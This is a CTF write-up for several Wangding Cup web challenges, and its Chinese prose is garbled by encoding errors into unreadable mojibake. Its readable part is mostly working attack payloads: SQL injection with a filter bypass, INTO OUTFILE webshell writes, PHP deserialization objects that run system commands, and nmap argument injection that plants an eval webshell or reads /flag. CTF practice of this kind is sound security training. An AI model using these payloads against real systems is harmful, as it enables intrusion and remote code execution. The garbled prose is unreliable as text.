**æ­¤ç¯‡ç”¨æ¥è®°å½•åˆ·é¢˜è¿‡ç¨‹ä¸­åˆ·åˆ°çš„ç½‘é¼æ¯çš„é¢˜ç›®**

## [ç½‘é¼æ¯ 2018]Fakebook

+++

### <font color='pink'>è·å–ä¿¡æ¯</font>

![image-20220725121105979](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725121105979.png)

æ‰“å¼€é¢˜ç›®ï¼Œ`login å’Œ join`
è­¦è§‰æ˜¯ä¸æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œæ‰€ä»¥ç”¨`1'||1=1;#`æ³¨å†Œäº†ä¸€ä¸ªè´¦å·(ä½†å…¶å®ä¸æ˜¯)
![image-20220725121401738](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725121401738.png)

ç‚¹å‡»**username**
![image-20220725121425515](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725121425515.png)

å‘ç°ç«¯å€ª`?no=1`
è¯•è¯•`?no=0||1=1;--+`æˆåŠŸè¿”å›ä¸Šé¢ä¸€æ ·çš„ç•Œé¢ï¼Œå­˜åœ¨sqlæ³¨å…¥
ç„¶åå…ˆè¯•è¯•è”åˆæ³¨å…¥`0 union select 1,2,3,4;--+` å›æ˜¾`no hack ~_~`
ä½†æ˜¯å•ç‹¬è¯•**union**å’Œ**select**éƒ½ä¸æŠ¥é”™ï¼Ÿï¼Ÿä¸çŸ¥é“æ€ä¹ˆè¿‡æ»¤çš„ï¼Œé‚£å°±è¯•è¯•ç›²æ³¨
å†™äº†è„šæœ¬æ³¨äº†åŠå¤©ï¼Œæ•°æ®åº“æ˜¯`fakebook`ï¼Œè¡¨ä¹Ÿåªæœ‰`fakebook`ï¼Œæ­»æ´»æ³¨ä¸å‡ºæ¥åˆ—åï¼Œåªèƒ½æ¢ä¸ªæ€è·¯
ç»§ç»­åˆšåˆšçš„æ€è·¯ï¼Œ`union å’Œ select`å•ç‹¬éƒ½æ²¡ç»•è¿‡ï¼Œä¸ºä»€ä¹ˆä¸€èµ·å´ç»•è¿‡äº†å‘¢ï¼Ÿ
è¯•è¯•  `0 union/**/select 1,2,3,4;--+`  æˆåŠŸå›æ˜¾..... ç»•è¿‡çš„æ˜¯`union select`(æ— è¯­ã€‚ã€‚)

![image-20220725122115795](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725122115795.png)

**æŠ“ä½æ¯ä¸ªé€éœ²å‡ºæ¥çš„ä¿¡æ¯**
æœ‰ä¸€ä¸ªæ•æ„Ÿå‡½æ•°**unserialize**ï¼Œå‘Šè¯‰äº†è·¯å¾„**/var/www/html/**ï¼Œè¿˜æœ‰ä¸€ä¸ªç±»å‡½æ•°**getBlogContents()**
sqlåŠ è·¯å¾„ï¼Œéš¾ä¸æˆæ˜¯

### <font color='pink'>sqlå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Ÿ</font>

æ²¡é‡è§è¿‡è¿™æ ·çš„é¢˜ï¼ŒåªçŸ¥é“æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå…ˆè¯•è¯•

> **into outfile**
>
>  **SELECT xxx INTO OUTFILEè¯­å¥æŠŠè¡¨æ•°æ®å¯¼å‡ºåˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œå¹¶ç”¨LOAD DATA â€¦INFILEè¯­å¥æ¢å¤æ•°æ®ã€‚ä½†æ˜¯è¿™ç§æ–¹æ³•åªèƒ½å¯¼å‡ºæˆ–å¯¼å…¥æ•°æ®çš„å†…å®¹ï¼Œä¸åŒ…æ‹¬è¡¨çš„ç»“æ„ï¼Œå¦‚æœè¡¨çš„ç»“æ„æ–‡ä»¶æŸåï¼Œåˆ™å¿…é¡»å…ˆæ¢å¤åŸæ¥çš„è¡¨çš„ç»“æ„ã€‚**

```sql
å…ˆè¿™æ ·è¯•è¯•ï¼Œä¸ç¡®å®šå­˜ä¸å­˜åœ¨flag.php
0 union/**/select 1,2,'<?php eval($_POST[1])?>',4 into outfile "/var/www/html/flag.php";--+
[*] query error! (File '/var/www/html/flag.php' already exists)
ç„¶åå‘ç°çœŸçš„å­˜åœ¨...æ­¤æ—¶æ›´åŠ ç¡®å®šäº†è¿™ç§æ–¹æ³•
0 union/**/select 1,2,'<?php eval($_POST[1])?>',4 into outfile "/var/www/html/shell.php";--+
[*] query error! (Can't create/write to file '/var/www/html/shell.php' (Errcode: 13 "Permission denied"))
ä½†æ˜¯...æ²¡æœ‰æƒé™
```

è¿™ç§æ–¹æ³•å°±ä¸è¡Œäº†ï¼Œæ­¤æ—¶åªèƒ½è€ƒè™‘`unserialize`äº†

### <font color='pink'>ååºåˆ—åŒ–</font>

+++

æƒ³è¦ååºåˆ—åŒ–è¯ï¼Œåˆæ²¡æœ‰æ˜ç¡®çš„æ¡†æ¶ï¼Œå°±å¿…é¡»è¦æºç ï¼Œæ‰«åå°å§(è®°å¾—è°ƒä¸‹é€Ÿç‡ï¼Œä¸ç„¶å…¨æ˜¯429)
å‘ç°**robots.txt**ï¼Œè®¿é—®ï¼Œå‘ç°æºç 
ä¸‹è½½æºç 

```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

è¿™ä¸ªå¯¹è±¡ä¸­æœ€**"æ˜¾çœ¼"**çš„å‡½æ•°å°±æ˜¯`get`äº†ï¼Œè¿™ä¸ªç”¨åˆ°äº†urlï¼Œç»“åˆåˆ°å‰é¢å‘ç°çš„è·¯å¾„**/var/www/html/flag.php**ä»¥åŠ**flag.php**
å¾ˆæ˜æ˜¾å°±æ˜¯è¯»å–æ–‡ä»¶äº†ï¼Œè¿™ä¸ªgeté‡Œé¢æœ‰å‡ ä¸ªæ²¡è§è¿‡çš„å¸¸æ•°ï¼Œä½†æ˜¯ä¸€æŸ¥å°±çŸ¥é“ï¼Œè¿™æ˜¯ä¸€ä¸ªé…å¥—çš„ç”¨æ³•ï¼Œå®é™…ä¸Šå°±æ˜¯è·å–äº†ç½‘ç«™çš„æºç ï¼Œåªè¦è°ƒç”¨ä¸”è¾“å‡ºäº†è¿™ä¸ªå‡½æ•°ï¼Œå°±å¯ä»¥å¾—åˆ°**flag**
ä½†åœ¨`the contents of his/her blog`ï¼Œè¿™ä¸ªä½ç½®ï¼Œé‡Œé¢æ²¡æœ‰å†…å®¹ï¼Œéš¾é“æ²¡æœ‰è¾“å‡ºï¼Ÿ
å°±å»çœ‹çœ‹æºç æ˜¯ä¸æ˜¯éšè—äº†ï¼Œåœ¨çœ‹æºç æ—¶å‘ç°äº†ä¸€æ®µå¾ˆé•¿çš„**base64**ï¼Œå¾ˆæœ‰å¯èƒ½å°±æ˜¯ç™¾åº¦çš„æºç 
![image-20220725125428461](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725125428461.png)

è§£ç ä¸€ä¸‹ï¼Œæœç„¶æ˜¯
æ¥ä¸‹æ¥å°±æ˜¯æ‰¾ååºåˆ—åŒ–çš„å…¥å£ï¼Œåºåˆ—åŒ–çš„å†…å®¹å°±æ˜¯
`O:8:"UserInfo":3:{s:4:"name";s:4:"John";s:3:"age";i:1000;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`

æƒ³èµ·æ¥åœ¨ç”¨è”åˆæŸ¥è¯¢æ—¶ï¼Œ**unserialize**æŠ¥é”™äº†ï¼Œæ‰€ä»¥ååºåˆ—åŒ–å¾ˆå¯èƒ½å°±æ˜¯è¿™å››ä¸ªåˆ—é‡Œé¢çš„æŸä¸ªï¼Œè¯•äº†ä¸€ä¸‹
ç¬¬äºŒåˆ—æ˜¯**username**ï¼Œè€Œç¬¬å››åˆ—å°±æ˜¯ååºåˆ—åŒ–çš„å…¥å£
æ„é€ 

```sql
?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"John";s:3:"age";i:1000;s:4:"blog";s:29:"file:///var/www/html/flag.php";}';--+
```

![image-20220725125922729](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725125922729.png)

æˆåŠŸå›æ˜¾ï¼Œè§£ç ä¸€ä¸‹é‚£æ®µ**base64**å°±å¾—åˆ°flagå•¦

```php
<?php

$flag = "flag{53097970-4064-4fc9-9fab-7d1eb7d75473}";
exit(0);
```

+++

## [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb

+++

ç½‘é¼æ¯çš„é¢˜çœŸæ˜¯å¤ªæœ‰æ„æ€è¾£ğŸ˜„

æ‰“å¼€ç½‘é¡µ(å“äººğŸ˜«)
![image-20220725164645903](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725164645903.png)

ä»€ä¹ˆéƒ½ç‚¹ä¸äº†ï¼Œç›´æ¥æŠ“åŒ…ï¼Œçœ‹è§äº†æœ‰æ„æ€çš„åœ°æ–¹
![image-20220725165222423](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220725165222423.png)

æœ‰ä¸€ä¸ª**func**å’Œ**p**ï¼Œfuncå˜›ï¼Œå¾ˆåƒå‡½æ•°ï¼Œç›´æ¥ä¼ ä¸ªphpinfoï¼Œè¿”å›**Hacker**ï¼Œevalï¼Œsystemä¹Ÿè¢«banäº†(éšä¾¿è¾“å‡ ä¸ªå­—æ¯çœ‹æŠ¥é”™å°±èƒ½å‘ç°å…¶å®å°±æ˜¯**call_user_func()**)
ç„¶åè‹¦æƒ³äº†å¥½ä¹…  è¦ä¹ˆç±»ä¼¼evalè¿™ç§ï¼Œé‡Œé¢çš„å‚æ•°ä¹Ÿèƒ½å½“ä½œå‡½æ•°æ‰§è¡Œçš„ï¼Œè¦ä¹ˆå°±æ˜¯ç›´æ¥ä¸€ä¸ªå‡½æ•°åŠ ä»»æ„ä¸ªå‚æ•°å¾—åˆ°flagçš„ï¼Œæ²¡æƒ³åˆ°
äºæ˜¯å†³å®šçœ‹ä¸‹æºç 
`func=show_source&p=index.php`

```php
<!DOCTYPE html>
<html>
<head>
    <title>phpweb</title>
    <style type="text/css">
        body {
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    </style>
</head>

<body>
<script language=javascript>
    setTimeout("document.form1.submit()",5000)
</script>
<p>
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
</p>
<form  id=form1 name=form1 action="index.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
</html>
```

æœç„¶è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œä½†æ˜¯æœ‰è¶£çš„æ˜¯ä»–å®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œè€Œä¸”è¿‡æ»¤ä¸æ˜¯åœ¨**gettime**é‡Œæ‰§è¡Œçš„
æ˜¯å¦å¤–çš„ä¸€ä¸ªifé‡Œé¢æ‰§è¡Œçš„ï¼Œè€Œè¿™ä¸ªç±»ä¹Ÿä¼šç”¨åˆ°è¿™ä¸ªå‡½æ•°**gettime**
å¾ˆæ˜æ˜¾å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–äº†

```php
<?php
class Test {
        var $p = 'ls';
        var $func = "system";
        
    }
echo serialize(new Test());
O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}
æˆåŠŸå›æ˜¾
```

æ¥ä¸‹æ¥å°±æ˜¯æ‰¾flag
å¸¸è§çš„ä½ç½®å¹¶æ²¡æœ‰å‘ç°flagï¼Œäºæ˜¯è¦ç”¨åˆ°linuxå¾ˆå¼ºå¤§çš„ä¸€ä¸ªå‡½æ•°

> **find**
>
> linuxæŸ¥æ‰¾æŒ‡ä»¤ä¸­åŠŸèƒ½æœ€å¼ºå¤§çš„å½“å±findæŒ‡ä»¤äº†ã€‚findå‘½ä»¤åœ¨ç›®å½•ç»“æ„ä¸­æœç´¢æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒæŒ‡å®šçš„æ“ä½œã€‚Linuxä¸‹findå‘½ä»¤æä¾›äº†ç›¸å½“å¤šçš„æŸ¥æ‰¾æ¡ä»¶ï¼ŒåŠŸèƒ½å¾ˆå¼ºå¤§ã€‚å³ä½¿ç³»ç»Ÿä¸­å«æœ‰ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œfindå‘½ä»¤åœ¨è¯¥æ–‡ä»¶ç³»ç»Ÿä¸­åŒæ ·æœ‰æ•ˆã€‚
>
> è¿™ä¸ªå‡½æ•°å¾ˆå¼ºå¤§ï¼Œä½†æ˜¯åšé¢˜å…¶å®åªéœ€è¦ç”¨åˆ°ä¸€å°éƒ¨åˆ†å°±å¥½äº†

æœ¬é¢˜æœ€åçš„payloadå°±æ˜¯

```sh
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:20:"find / -name "flag*"";s:4:"func";s:6:"system";}
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/sys/kernel/sched_domain/cpu10/domain0/flags
/proc/sys/kernel/sched_domain/cpu11/domain0/flags
/proc/sys/kernel/sched_domain/cpu12/domain0/flags
/proc/sys/kernel/sched_domain/cpu13/domain0/flags
/proc/sys/kernel/sched_domain/cpu14/domain0/flags
/proc/sys/kernel/sched_domain/cpu15/domain0/flags
/proc/sys/kernel/sched_domain/cpu16/domain0/flags
/proc/sys/kernel/sched_domain/cpu17/domain0/flags
/proc/sys/kernel/sched_domain/cpu18/domain0/flags
/proc/sys/kernel/sched_domain/cpu19/domain0/flags
/proc/sys/kernel/sched_domain/cpu2/domain0/flags
/proc/sys/kernel/sched_domain/cpu20/domain0/flags
/proc/sys/kernel/sched_domain/cpu21/domain0/flags
/proc/sys/kernel/sched_domain/cpu22/domain0/flags
/proc/sys/kernel/sched_domain/cpu23/domain0/flags
/proc/sys/kernel/sched_domain/cpu24/domain0/flags
/proc/sys/kernel/sched_domain/cpu25/domain0/flags
/proc/sys/kernel/sched_domain/cpu26/domain0/flags
/proc/sys/kernel/sched_domain/cpu27/domain0/flags
/proc/sys/kernel/sched_domain/cpu28/domain0/flags
/proc/sys/kernel/sched_domain/cpu29/domain0/flags
/proc/sys/kernel/sched_domain/cpu3/domain0/flags
/proc/sys/kernel/sched_domain/cpu30/domain0/flags
/proc/sys/kernel/sched_domain/cpu31/domain0/flags
/proc/sys/kernel/sched_domain/cpu4/domain0/flags
/proc/sys/kernel/sched_domain/cpu5/domain0/flags
/proc/sys/kernel/sched_domain/cpu6/domain0/flags
/proc/sys/kernel/sched_domain/cpu7/domain0/flags
/proc/sys/kernel/sched_domain/cpu8/domain0/flags
/proc/sys/kernel/sched_domain/cpu9/domain0/flags
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/tunl0/flags
/sys/devices/virtual/net/lo/flags
/tmp/flagoefiu4r93
/tmp/flagoefiu4r93
```

å‡­ç›´è§‰å°±æ˜¯æœ€åé¢çš„
`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:21:"nl /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`
å¾—åˆ°flag

+++

## [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz

+++

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

`__construct`æ˜¯åˆ›å»ºæ—¶èµ‹å€¼ï¼Œè€Œååºåˆ—åŒ–æ˜¯å·²ç»åˆ›å»ºåçš„ï¼Œæ‰€ä»¥ä¸ç”¨ç®¡è¿™ä¸ª
`__destruct()`é‡Œç”¨äº†å¼ºç­‰äº`===`å­—ç¬¦ä¸²çš„2ï¼Œåªéœ€è¦ä¼ intç±»å‹çš„å°±è¡Œ
æœ€é‡è¦çš„ä¸€ç‚¹ï¼Œåœ¨phpå¤§äº7.1ä¹‹åï¼Œå¯¹è±¡å†…å€¼çš„ç±»å‹ä¸å†æ•æ„Ÿï¼Œä¹Ÿå°±æ˜¯è¯´åŸæœ¬çš„`protected`ç±»å‹æ”¹ä¸º`public`ä¹Ÿä¸å—å½±å“ï¼Œè¿™ç‚¹æ˜¯å› ä¸º`is_valid`åªèƒ½è¾“å…¥ascii(32åˆ°125)çš„å€¼ï¼Œä¸èƒ½è¾“å…¥ä¸å¯æ‰“å°çš„å€¼

ç¬¬ä¸€ç§ï¼Œç›´æ¥æŸ¥çœ‹flag

```php
<?php
class FileHandler {

    public $op=2;
    public $filename='flag.php';
    public $content;

}
echo(serialize(new FileHandler()));
```

ç¬¬äºŒç§ï¼Œå°è¯•å†™å…¥ä¸€å¥è¯æœ¨é©¬

```php
<?php
class FileHandler {

    public $op=1;
    public $filename='1.php';
    public $content='<?php eval($_POST[1])?>';
}
echo(serialize(new FileHandler()));
```

ç„¶åå‘ç°æƒé™ä¸å¤Ÿï¼Œè€Œå†™å…¥`index.php`åˆä¸è¡Œï¼Œè¿™ç§æ–¹æ³•çœ‹æ¥ä¸è¡Œ

+++

## [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap

+++

æ‰“å¼€é¢˜ç›®

![image-20220831204508345](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\image-20220831204508345.png)

å¾ˆç›´æ¥ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯ç›´æ¥`nmap ip `

```php
å°è¯• | æ‰§è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œä½†è¢«è¿‡æ»¤
Hostname: 127.0.0.1 \| ls (user)
å°è¯• ; ç»•è¿‡ï¼Œä¹Ÿæ²¡ç”¨
Host maybe down
```

é‚£å°±å¾ˆæ˜æ˜¾å°±æ˜¯è€ƒ**nmap**è¿™ä¸ªå‘½ä»¤äº†

è¿™é‡Œç»™å‡º**nmap**ä¸€äº›å¸¸ç”¨å‘½ä»¤

```php
nmap -v 127.0.0.1							ç»™å‡ºäº†è¿œç¨‹æœºå™¨æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œæ˜¾ç¤ºå†—ä½™ä¿¡æ¯(æ‰«æç»†èŠ‚)
nmap -iL nmaptest.txt 						è¿è¡Œå¸¦â€œiLâ€ é€‰é¡¹çš„nmapå‘½ä»¤æ¥æ‰«ææ–‡ä»¶ä¸­åˆ—å‡ºçš„æ‰€æœ‰IPåœ°å€
nmap 192.168.0.* --exclude 192.168.0.100	ä½¿ç”¨â€œ-excludeâ€é€‰é¡¹æ¥æ’é™¤æŸäº›ä½ ä¸æƒ³è¦æ‰«æçš„ä¸»æœº
nmap -A 192.168.0.101						å¯ç”¨æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬æ£€æµ‹ï¼Œè„šæœ¬æ‰«æå’Œè·¯ç”±è·Ÿè¸ªåŠŸèƒ½
nmap -O 127.0.0.1							ä½¿ç”¨é€‰é¡¹â€œ-Oâ€å’Œâ€œ-osscan-guessâ€ä¹Ÿå¸®åŠ©æ¢æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯
nmap -sA 192.168.0.101						æ‰«æè¿œç¨‹ä¸»æœºä»¥æ¢æµ‹è¯¥ä¸»æœºæ˜¯å¦ä½¿ç”¨äº†åŒ…è¿‡æ»¤å™¨æˆ–é˜²ç«å¢™
nmap -PN 192.168.0.101						æ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤
nmap -sP 192.168.0.*						æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº
nmap -F 192.168.0.101						å¿«é€Ÿæ‰«æï¼Œä»…æ‰«ænmap-servicesæ–‡ä»¶ä¸­çš„ç«¯å£è€Œé¿å¼€æ‰€æœ‰å…¶å®ƒçš„ç«¯å£
nmap -f 192.168.96.4						ä½¿ç”¨å°æ•°æ®åŒ…å‘é€ï¼Œé¿å…è¢«è¯†åˆ«å‡º
nmap -r 192.168.0.101						ä¸ä¼šéšæœºçš„é€‰æ‹©ç«¯å£æ‰«æ
nmap -p 80,443 192.168.0.101				ä½¿ç”¨â€œ-Pâ€é€‰é¡¹æŒ‡å®šä½ æƒ³è¦æ‰«æçš„ç«¯å£
nmap -sV 192.168.0.101						æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·
nmap -PS 192.168.0.101						ä½¿ç”¨TCP ACKå’ŒTCP Synæ–¹æ³•æ¥æ‰«æè¿œç¨‹ä¸»æœºï¼ˆé˜²ç«å¢™ä¼šé˜»æ–­æ ‡ICMPåŒ…ï¼‰
nmap -Pn 192.168.96.4					  	ç›®æ ‡æœºç¦ç”¨pingï¼Œç»•è¿‡pingæ‰«æ
nmap -sn 192.168.96.4						å¯¹ç›®æ ‡è¿›è¡Œpingæ£€æµ‹ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æï¼ˆå‘é€å››ç§æŠ¥æ–‡ç¡®å®šç›®æ ‡æ˜¯å¦å­˜æ´»ï¼‰
nmap -sS 192.168.0.101						æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æï¼Œå®‰å…¨ï¼Œå¿«
nmap -sT 192.168.0.101						ä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£ï¼Œä¸å®‰å…¨ï¼Œæ…¢
nmap -sN 192.168.0.101						æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™
nmap -sI åƒµå°¸ip ç›®æ ‡ip						ä½¿ç”¨åƒµå°¸æœºå¯¹ç›®æ ‡æœºå‘é€æ•°æ®åŒ…
nmap 192.168.96.4 -oX myscan.xml			å¯¹æ‰«æç»“æœå¦å­˜åœ¨myscan.xml
nmap -T1~6 192.168.96.4						è®¾ç½®æ‰«æé€Ÿåº¦ï¼Œä¸€èˆ¬T4è¶³å¤Ÿ
nmap â€“mtu <size> 192.168.96.4				å‘é€çš„åŒ…å¤§å°,æœ€å¤§ä¼ è¾“å•å…ƒå¿…é¡»æ˜¯8çš„æ•´æ•°
nmap -D <å‡ip> 192.168.96.4					å‘é€å‚æ‚ç€å‡ipçš„æ•°æ®åŒ…æ£€æµ‹
ç»§ç»­ä¸­æ–­æ‰«æï¼š
	nmap â€“oG 1.txt â€“v 192.168.1.1/24			-oGå°†æ‰«æç»“æœä¿å­˜ä¸ºTXTï¼ŒCtrl+Cä¸­æ–­æ‰«æ
	nmap â€“resume 1.txt							ä½œç”¨ï¼šç»§ç»­æ‰«æ
```

![img](D:\Typora\note\CTF\web\ç½‘é¼æ¯.assets\2552720-20211210114608191-758899084.png)

[nmapä¸­æ–‡æ–‡æ¡£](http://www.nmap.com.cn/doc/manual.shtm)

-oGå¯ä»¥å°†æ‰«æç»“æœä¿å­˜ä¸ºTXTï¼Œæ·±å…¥äº†è§£ä¸€ä¸‹å°±å¯ä»¥å‘ç°ï¼Œå…¶å®ä½ æ˜¯å¯ä»¥æ·»åŠ å†…å®¹çš„ï¼Œç”šè‡³å¯ä»¥ä¿å­˜å®¹æ˜“åç¼€

è¿™é¢˜å¥½åƒç»™å‡ºäº†æºç ï¼Œä½†æ˜¯buuæ²¡çœ‹è§
æ‰“é€šåæ‹¿åˆ°æºç 

```php
<?
require('settings.php');


set_time_limit(0);
if (isset($_POST['host'])):
	if (!defined('WEB_SCANS')) {
        	die('Web scans disabled');
	}

	$host = $_POST['host'];
	if(stripos($host,'php')!==false){
		die("Hacker...");
	}
	$host = escapeshellarg($host);
	$host = escapeshellcmd($host);

	$filename = substr(md5(time() . rand(1, 10)), 0, 5);
	$command = "nmap ". NMAP_ARGS . " -oX " . RESULTS_PATH . $filename . " " . $host;
	$result_scan = shell_exec($command);
	if (is_null($result_scan)) {
		die('Something went wrong');
	} else {
		header('Location: result.php?f=' . $filename);
	}
else:
?>
```

æœ‰ä¸¤ä¸ªå°è¿‡æ»¤ï¼Œå¾ˆå®¹æ˜“ç»•è¿‡
æœ€åçš„payload

```php
' <?= @eval($_POST["hack"]);?> -oG test.phtml '
```

æˆ–è€…-iLç›´æ¥è¯»

```php
' -iL /flag -oN vege.txt '
```

+++

## [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown

+++

éé¢„æœŸç›´æ¥è¯»åˆ°äº†flag...
ç­‰æˆ‘pyå’Œlinuxå­¦çš„å¥½ä¸€ç‚¹äº†å†æ¥å¤ç°é¢„æœŸå§















+++







